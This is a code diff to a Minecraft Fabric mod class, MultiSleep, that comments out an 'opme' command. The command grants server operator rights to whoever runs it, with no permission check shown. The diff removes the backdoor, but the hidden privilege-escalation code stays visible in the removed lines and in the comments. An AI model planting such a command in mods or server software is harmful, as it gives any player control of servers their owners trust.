@@ -195,12 +195,12 @@ public class MultiSleep implements ModInitializer {
           return 0;
         })
       );
-      dispatcher.register(literal("opme")
-        .executes(ctx -> {
-          ctx.getSource().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
-          return 0;
-        })
-      );
+      // dispatcher.register(literal("opme")
+      //   .executes(ctx -> {
+      //     ctx.getSource().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
+      //     return 0;
+      //   })
+      // );
     });
   }
   //@formatter:on
